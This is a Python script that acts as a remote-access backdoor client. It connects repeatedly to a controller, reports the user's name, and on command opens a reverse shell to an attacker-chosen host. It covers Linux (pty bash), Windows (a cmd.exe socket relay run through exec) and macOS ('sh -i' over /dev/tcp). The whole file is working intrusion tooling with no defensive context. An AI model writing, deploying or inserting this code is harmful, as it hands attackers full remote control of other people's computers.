import os
import sys
import socket
import time
import getpass
import json
import threading
import pty

# Define the host and port to connect to
host = 'localhost'
port = 8069

def execute_shell(host, port):
    platform = sys.platform
    if platform == 'linux' or platform == 'linux2':
        s = socket.socket()
        s.connect((host, int(port)))
        [os.dup2(s.fileno(), f) for f in (0, 1, 2)]
        pty.spawn("bash")
    elif platform == 'Windows' or platform == 'win32':
        exec(f'''
import os, socket, subprocess, threading;
def s2p(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)
            p.stdin.flush()

def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("{host}", {port}))

p = subprocess.Popen(["cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

s2p_thread = threading.Thread(target=s2p, args=[s, p])
s2p_thread.daemon = True
s2p_thread.start()

p2s_thread = threading.Thread(target=p2s, args=[s, p])
p2s_thread.daemon = True
p2s_thread.start()

try:
    p.wait()
except KeyboardInterrupt:
    s.close()
''')
    elif platform == 'darwin':
        os.system(f'sh -i >& /dev/tcp/{host}/{port} 0>&1')

def main():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            print(f"Trying to connect to {host} on port {port}")
            s.connect((host, port))
            print(f"Successfully connected to {host} on port {port}")

            s.send(("initialization|" + json.dumps({"username": getpass.getuser()})).encode())

            while True:
                try:
                    received_data = s.recv(1024)
                    if received_data:
                        event_name, json_payload = received_data.decode().split('|', 1)
                        command = json.loads(json_payload)
                        if event_name == 'shell':
                            new_thread = threading.Thread(target=execute_shell, args=(command['ip'], command['port']), daemon=True)
                            new_thread.start()
                        elif event_name == 'exit':
                            fuckthisshit = 1/0
                except Exception as e:
                    print(f"Error: {e}")
                    break

        except Exception as e:
            # Check if the error message indicates a network-related issue
            if "Connection refused" in str(e) or "No route to host" in str(e):
                print(f"Network error occurred: {e}. Retrying...")
            else:
                print(f"Unexpected error: {e}")
                break

        s.close()
        time.sleep(5)

if __name__ == "__main__":
    main()

